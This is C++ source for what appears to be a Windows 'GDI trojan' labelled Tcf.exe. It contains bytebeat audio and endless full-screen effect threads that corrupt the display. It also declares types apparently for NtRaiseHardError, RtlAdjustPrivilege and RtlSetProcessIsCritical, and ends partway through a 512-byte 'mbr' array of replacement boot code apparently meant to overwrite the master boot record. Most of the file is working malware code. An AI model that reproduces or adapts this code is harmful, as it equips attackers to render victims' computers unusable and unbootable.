﻿#define _USE_MATH_DEFINES
#include <windows.h>
#include <windowsx.h>
#include <winuser.h>
#include <wingdi.h>
#include <mmsystem.h>
#include <mmreg.h>
#include <commctrl.h>
#include <shlwapi.h>
#include <shellapi.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <cmath>
#include <math.h>
#include <cstdlib>
#include <stdlib.h>
#include <cstdio>
#include <stdio.h>
#include <ctime>
#include <time.h>
#include <stdint.h>
#include <intrin.h>
#include <vector>
#include <algorithm>
#include <random>

#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "msimg32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "psapi.lib")
typedef LONG(NTAPI* NRHEdef)(LONG, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
typedef LONG(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS(NTAPI* RSPICdef)(BOOLEAN NewValue, PBOOLEAN OldValue, BOOLEAN IsWinlogon);
void sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	static char buffer[8000 * 30];
	for (DWORD t = 0; t < sizeof(buffer); ++t) {
		buffer[t] = static_cast<char>(t * (t >> 5 | t >> 4) >> (t >> 16));
	}

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

	while (!(header.dwFlags & WHDR_DONE)) {
		Sleep(100);
	}

	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
void sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

    static char buffer[11025 * 30];
    for (DWORD t = 0; t < sizeof(buffer); ++t) {
        buffer[t] = static_cast<char>((0xFD & t >> 0) * (t >> 8 | t));
    }

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

    while (!(header.dwFlags & WHDR_DONE)) {
        Sleep(100);
    }

    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

    static char buffer[32000 * 30];
    for (DWORD t = 0; t < sizeof(buffer); ++t) {
        buffer[t] = static_cast<char>((0xFD & t >> 0) * (t >> 8 | t >> 9) * t);
    }

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

    while (!(header.dwFlags & WHDR_DONE)) {
        Sleep(100);
    }

    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

    static char buffer[8000 * 30];
    for (DWORD t = 0; t < sizeof(buffer); ++t) {
        buffer[t] = static_cast<char>((((t >> 8) & (t * 173)) | ((t >> 6) & (t * 254))) & ((t < 4096 ? 192 : 0) + 127));
    }

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

    while (!(header.dwFlags & WHDR_DONE)) {
        Sleep(100);
    }

    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

    static char buffer[8000 * 30];
    for (DWORD t = 0; t < sizeof(buffer); ++t) {
        buffer[t] = static_cast<char>((((t >> 4) | (t * 3) | 12) + (((t >> 12) & 43) * 8) ^ 231) - ((((t + 4) & 39) ? 40 : 0) + 2));
    }

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

    while (!(header.dwFlags & WHDR_DONE)) {
        Sleep(100);
    }

    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	const char notes[] = "kotojokohogohotojokohogokokhpmjmjfokhomkjhggcckotojokohogohotojokohogokokhpmjmjfrmorokfjkkkkkkrpomkjkmokmpoprrjjkkoommoottqqhjkkjjhfecebccccccfffhihfdfcdahhhjkjhghegcmjcjmjpjojmjkhchkhohmhkhjhkhmhohphmhoomkjkhhhhhh";
	int len = sizeof(notes) - 1;

	static char buffer[11025 * 30];
	for (DWORD t = 0; t < sizeof(buffer); ++t) {
		int idx = (t >> 10) & 255;
		int code = (idx < len) ? (unsigned char)notes[idx] : 0;
		double freq = pow(2.0, (code - 58) / 12.0);
		buffer[t] = static_cast<char>((((int)(t * freq) * 63) >> 6) & 132);
	}

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

	Sleep(30000);

	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
void sound7() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	static char buffer[11025 * 30];
	for (DWORD t = 0; t < sizeof(buffer); ++t) {
		buffer[t] = static_cast<char>(t * (t ^ t >> 10 & t >> 9) + t);
	}

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

	Sleep(30000);

	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
void sound8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

    static char buffer[11025 * 30];
    for (DWORD t = 0; t < sizeof(buffer); ++t) {
        buffer[t] = static_cast<char>(t * (t ^ t >> 10));
    }

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

    while (!(header.dwFlags & WHDR_DONE)) {
        Sleep(100);
    }

    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
typedef struct {
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors {
	RGBQUAD hsl2rgb(HSL hsl) {
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= 0.5f) ? (l * (1.0f + sl)) : (l + sl - l * sl);

		if (v > 0) {
			FLOAT m;
			FLOAT sv;
			int sextant;
			FLOAT fract, vsf, mid1, mid2;

			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.0f;
			sextant = (int)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant) {
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.0f);
		rgb.rgbGreen = (BYTE)(g * 255.0f);
		rgb.rgbBlue = (BYTE)(b * 255.0f);

		return rgb;
	}

	HSL rgb2hsl(RGBQUAD rgb) {
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.0f;
		FLOAT _g = (FLOAT)g / 255.0f;
		FLOAT _b = (FLOAT)b / 255.0f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.0f;
		FLOAT s = 0.0f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.0f);

		if (fDelta != 0.0f) {
			s = l < 0.5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.0f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.0f + (fDelta / 2.0f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.0f + (fDelta / 2.0f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.0f + (fDelta / 2.0f)) / fDelta);

			if (_r == rgbMax) {
				h = deltaB - deltaG;
			}
			else if (_g == rgbMax) {
				h = (1.0f / 3.0f) + deltaR - deltaB;
			}
			else if (_b == rgbMax) {
				h = (2.0f / 3.0f) + deltaG - deltaR;
			}

			if (h < 0.0f) {
				h += 1.0f;
			}
			if (h > 1.0f) {
				h -= 1.0f;
			}
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}
}

DWORD WINAPI Payload1(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1) {
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++) {
			for (int y = 0; y < screenHeight; y++) {
				int index = y * screenWidth + x;

				int fx = (int)((i ^ 4) + (i * 4) * log(x * i & i * y ^ x * i * y * i));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI Shader1(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	while (true) {
		HDC hdc = GetDC(NULL);
		int rx = rand() % w;
		int ry = rand() % h;
		int dx = (rand() % 11) - 5;
		int dy = (rand() % 11) - 5;
		BitBlt(hdc, rx + dx, 0, 100, h, hdc, rx, 0, SRCPAINT);
		BitBlt(hdc, 0, ry + dy, w, 100, hdc, 0, ry, SRCPAINT);
		ReleaseDC(NULL, hdc);
		Sleep(10);
	}
	return 0;
}

DWORD WINAPI Payload2(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	DWORD* lpBits = new DWORD[w * h];
	double angle = 0.0;
	double zoom = 1.0;

	while (true) {
		HDC hdc = GetDC(NULL);
		HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP hbit = CreateBitmap(w, h, 1, 32, lpBits);
		SelectObject(hdcMem, hbit);
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(hbit, w * h * 4, lpBits);

		double c = cos(angle);
		double s = sin(angle);

		for (int x = 0; x < w; x++) {
			int dx = x - w / 2;
			for (int y = 0; y < h; y++) {
				int dy = y - h / 2;
				int rx = (int)((dy * c + s * dx) / zoom);
				int ry = (int)((dx * c - dy * s) / zoom);

				unsigned int u1 = (unsigned int)(rx * rx);
				unsigned int u2 = (unsigned int)(ry * ry);

				double val = sqrt((double)(u2 ^ u1)) + sqrt((double)(u2 + u1));
				double hue = fmod(val, 360.0);
				if (hue < 0.0) hue += 360.0;

				double xCol = 1.0 - fabs(fmod(hue / 60.0, 2.0) - 1.0);
				double r = 0.0, g = 0.0, b = 0.0;

				if (hue < 60.0) {
					r = 1.0; g = xCol; b = 0.0;
				}
				else if (hue < 120.0) {
					r = xCol; g = 1.0; b = 0.0;
				}
				else if (hue < 180.0) {
					r = 0.0; g = 1.0; b = xCol;
				}
				else if (hue < 240.0) {
					r = 0.0; g = xCol; b = 1.0;
				}
				else if (hue < 300.0) {
					r = xCol; g = 0.0; b = 1.0;
				}
				else {
					r = 1.0; g = 0.0; b = xCol;
				}

				lpBits[y * w + x] = (((int)(r * 255.0) & 0xFF) << 16) |
					(((int)(g * 255.0) & 0xFF) << 8) |
					((int)(b * 255.0) & 0xFF);
			}
		}

		angle += 0.01;
		zoom += 0.01;

		SetBitmapBits(hbit, w * h * 4, lpBits);
		BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdcMem);
		DeleteObject(hbit);
	}

	delete[] lpBits;
	return 0;
}
DWORD WINAPI Payload3(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	while (true) {
		HDC hdc = GetDC(NULL);
		HPEN hPen = CreatePen(PS_SOLID, (rand() % 5) + 1, RGB(rand() % 256, rand() % 256, rand() % 256));
		HPEN hOldPen = (HPEN)SelectObject(hdc, hPen);
		MoveToEx(hdc, rand() % w, rand() % h, NULL);
		LineTo(hdc, rand() % w, rand() % h);
		SelectObject(hdc, hOldPen);
		DeleteObject(hPen);
		ReleaseDC(NULL, hdc);
		Sleep(10);
	}
	return 0;
}

DWORD WINAPI Shader2(LPVOID lpParam) {
	int sx = GetSystemMetrics(SM_CXSCREEN);
	int sy = GetSystemMetrics(SM_CYSCREEN);
	int redrawCounter = 0;
	while (true) {
		HDC hdc = GetDC(NULL);
		int s = redrawCounter;
		for (int i = 0; i < sx; i += 200) {
			StretchBlt(hdc, i, s, 200, 200, hdc, i - 5, s - 5, 210, 210, SRCCOPY);
		}
		redrawCounter += 200;
		if (redrawCounter >= sy) {
			redrawCounter = 0;
		}
		ReleaseDC(NULL, hdc);
		Sleep(10);
	}
	return 0;
}
DWORD WINAPI Payload4(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	FLOAT hue = 0.0f;

	while (true) {
		HDC hdc = GetDC(NULL);

		HSL hsl = { hue, 1.0f, 0.5f };
		RGBQUAD rgb = Colors::hsl2rgb(hsl);
		HBRUSH hBrush = CreateSolidBrush(RGB(rgb.rgbRed, rgb.rgbGreen, rgb.rgbBlue));
		HBRUSH hOldBrush = (HBRUSH)SelectObject(hdc, hBrush);
		PatBlt(hdc, 0, 0, w, h, PATINVERT);
		SelectObject(hdc, hOldBrush);
		DeleteObject(hBrush);

		hue += 0.02f;
		if (hue >= 1.0f) {
			hue -= 1.0f;
		}

		for (int i = 0; i < 15; i++) {
			int y = rand() % h;
			int blockHeight = (rand() % 40) + 10;
			int offset = (rand() % 41) - 20;
			BitBlt(hdc, offset, y, w, blockHeight, hdc, 0, y, SRCCOPY);
		}

		ReleaseDC(NULL, hdc);
		Sleep(15);
	}
	return 0;
}
DWORD WINAPI Payload5(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	while (true) {
		HDC hdc = GetDC(NULL);
		StretchBlt(hdc, -10, -10, w + 20, h + 20, hdc, 0, 0, w, h, SRCPAINT);
		ReleaseDC(NULL, hdc);
		Sleep(20);
	}
	return 0;
}

DWORD WINAPI Shader3(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	FLOAT hue = 0.0f;
	while (true) {
		HDC hdc = GetDC(NULL);
		HSL hsl = { hue, 1.0f, 0.5f };
		RGBQUAD rgb = Colors::hsl2rgb(hsl);
		HBRUSH hBrush = CreateSolidBrush(RGB(rgb.rgbRed, rgb.rgbGreen, rgb.rgbBlue));
		HBRUSH hOldBrush = (HBRUSH)SelectObject(hdc, hBrush);
		PatBlt(hdc, 0, 0, w, h, PATINVERT);
		SelectObject(hdc, hOldBrush);
		DeleteObject(hBrush);
		hue += 0.03f;
		if (hue >= 1.0f) {
			hue -= 1.0f;
		}
		ReleaseDC(NULL, hdc);
		Sleep(25);
	}
	return 0;
}
DWORD WINAPI Payload6(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	int halfH = h / 2;
	while (true) {
		HDC hdc = GetDC(NULL);
		StretchBlt(hdc, 0, -10, w, halfH + 10, hdc, 0, 0, w, halfH, SRCCOPY);
		StretchBlt(hdc, 0, halfH, w, halfH + 10, hdc, 0, halfH, w, halfH, SRCCOPY);
		ReleaseDC(NULL, hdc);
		Sleep(20);
	}
	return 0;
}
DWORD WINAPI Payload7(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	BLENDFUNCTION bf = { AC_SRC_OVER, 0, 15, 0 };

	while (true) {
		HDC hdc = GetDC(NULL);
		HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP hbm = CreateCompatibleBitmap(hdc, w, h);
		HBITMAP hOldBmp = (HBITMAP)SelectObject(hdcMem, hbm);

		HBRUSH hBrush = CreateSolidBrush(RGB(0, 0, 0));
		RECT rect = { 0, 0, w, h };
		FillRect(hdcMem, &rect, hBrush);
		DeleteObject(hBrush);

		AlphaBlend(hdc, 0, 0, w, h, hdcMem, 0, 0, w, h, bf);

		SelectObject(hdcMem, hOldBmp);
		DeleteObject(hbm);
		DeleteDC(hdcMem);
		ReleaseDC(NULL, hdc);
		Sleep(30);
	}
	return 0;
}

DWORD WINAPI Shader4(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);

	while (true) {
		HDC hdc = GetDC(NULL);
		int fontSize = (rand() % 45) + 25;
		HFONT hFont = CreateFontA(
			fontSize, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
			DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
			DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, "Fredoka"
		);
		HFONT hOldFont = (HFONT)SelectObject(hdc, hFont);

		SetBkMode(hdc, TRANSPARENT);
		SetTextColor(hdc, RGB(rand() % 256, rand() % 256, rand() % 256));

		int x = rand() % w;
		int y = rand() % h;
		TextOutA(hdc, x, y, "Tcf.exe", 7);

		SelectObject(hdc, hOldFont);
		DeleteObject(hFont);
		ReleaseDC(NULL, hdc);
		Sleep(20);
	}
	return 0;
}
DWORD WINAPI Payload8(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	int totalPixels = w * h;
	BYTE* bits = (BYTE*)VirtualAlloc(NULL, (h + 1) * w * 4, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	while (true) {
		HDC hdc = GetDC(NULL);
		HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, bits);
		SelectObject(hdcMem, hbm);
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, totalPixels * 4, bits);
		int r = rand() % 3;
		int channelOffset = (r == 0) ? 2 : ((r == 1) ? 1 : 0);
		for (int i = 0; i < totalPixels; i++) {
			bits[(i * 4) + channelOffset] = (BYTE)i;
		}
		SetBitmapBits(hbm, totalPixels * 4, bits);
		BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdcMem);
		DeleteObject(hbm);
	}
	return 0;
}

DWORD WINAPI Shader5(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	const wchar_t* dlls[2] = { L"moricons.dll", L"imageres.dll" };
	int maxIcons[2] = { 100, 300 };

	while (true) {
		HDC hdc = GetDC(NULL);
		int choice = rand() % 2;
		int iconIndex = rand() % maxIcons[choice];
		HICON hIcon = NULL;

		ExtractIconExW(dlls[choice], iconIndex, &hIcon, NULL, 1);
		if (hIcon != NULL) {
			int size = (rand() % 220) + 128;
			int x = (rand() % w) - (size / 2);
			int y = (rand() % h) - (size / 2);
			DrawIconEx(hdc, x, y, hIcon, size, size, 0, NULL, DI_NORMAL);
			DestroyIcon(hIcon);
		}

		ReleaseDC(NULL, hdc);
		Sleep(15);
	}
	return 0;
}
DWORD WINAPI Payload9(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	FLOAT hue = 0.0f;

	while (true) {
		HDC hdc = GetDC(NULL);
		HSL hsl = { hue, 1.0f, 0.5f };
		RGBQUAD rgb = Colors::hsl2rgb(hsl);
		HBRUSH hBrush = CreateSolidBrush(RGB(rgb.rgbRed, rgb.rgbGreen, rgb.rgbBlue));
		HBRUSH hOldBrush = (HBRUSH)SelectObject(hdc, hBrush);
		PatBlt(hdc, 0, 0, w, h, PATINVERT);
		SelectObject(hdc, hOldBrush);
		DeleteObject(hBrush);

		hue += 0.015f;
		if (hue >= 1.0f) {
			hue -= 1.0f;
		}

		ReleaseDC(NULL, hdc);
		Sleep(20);
	}
	return 0;
}

DWORD WINAPI Shader6(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	int x = w / 4;
	int y = h / 4;
	int vx = 6;
	int vy = 6;
	FLOAT hue = 0.0f;

	while (true) {
		HDC hdc = GetDC(NULL);
		HFONT hFont = CreateFontA(
			64, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
			DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
			DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, "Baby Kruffy"
		);
		HFONT hOldFont = (HFONT)SelectObject(hdc, hFont);

		SIZE textSize;
		GetTextExtentPoint32A(hdc, "Tcf.exe", 7, &textSize);

		HSL hsl = { hue, 1.0f, 0.5f };
		RGBQUAD rgb = Colors::hsl2rgb(hsl);

		SetBkMode(hdc, TRANSPARENT);
		SetTextColor(hdc, RGB(rgb.rgbRed, rgb.rgbGreen, rgb.rgbBlue));
		TextOutA(hdc, x, y, "Tcf.exe", 7);

		x += vx;
		y += vy;

		if (x <= 0) {
			x = 0;
			vx = -vx;
		}
		else if (x + textSize.cx >= w) {
			x = w - textSize.cx;
			vx = -vx;
		}

		if (y <= 0) {
			y = 0;
			vy = -vy;
		}
		else if (y + textSize.cy >= h) {
			y = h - textSize.cy;
			vy = -vy;
		}

		hue += 0.02f;
		if (hue >= 1.0f) {
			hue -= 1.0f;
		}

		SelectObject(hdc, hOldFont);
		DeleteObject(hFont);
		ReleaseDC(NULL, hdc);
		Sleep(15);
	}
	return 0;
}
DWORD WINAPI shader7(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	RGBQUAD* rgbScreen = NULL;
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	ReleaseDC(0, hdcScreen);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			rgbScreen[i].rgbRed += 666;
			rgbScreen[i].rgbGreen += 666;
			rgbScreen[i].rgbBlue += 666;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		Sleep(1000);
		ReleaseDC(NULL, hdcScreen);
	}
	return 0;
}
HWAVEOUT hWaveOut9 = 0;
WAVEHDR header9 = { 0 };

void sound9_start() {
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut9, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	static char buffer[8000 * 60];
	for (DWORD t = 0; t < sizeof(buffer); ++t) {
		buffer[t] = static_cast<char>((t * ((t & 4096 ? t % 65536 < 59392 ? 7 : t & 7 : 16) + (1 & t >> 14)) >> (3 & -(int)t >> (t & 2048 ? 2 : 10)) >> (3 & t >> 8) | t >> (t & 4096 ? 2 : 3)));
	}

	header9 = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut9, &header9, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut9, &header9, sizeof(WAVEHDR));
}

void sound9_stop() {
	waveOutReset(hWaveOut9);
	waveOutUnprepareHeader(hWaveOut9, &header9, sizeof(WAVEHDR));
	waveOutClose(hWaveOut9);
}

unsigned char mbr[512] = {
	0x31, 0xC0, 0x8E, 0xD8, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xB8, 0x00, 0xA0,
	0x8E, 0xC0, 0x31, 0xDB, 0x31, 0xFF, 0xBA, 0xC8, 0x00, 0xB9, 0x40, 0x01,
	0x89, 0xD8, 0x01, 0xC8, 0x01, 0xD0, 0x24, 0x1F, 0x04, 0x20, 0xAA, 0xE2,
	0xF3, 0x4A, 0x75, 0xED, 0x43, 0xEB, 0xE4, 0x80, 0x01, 0x01, 0x00, 0x0C,
	0xFE, 0x3F, 0x01, 0x3F, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
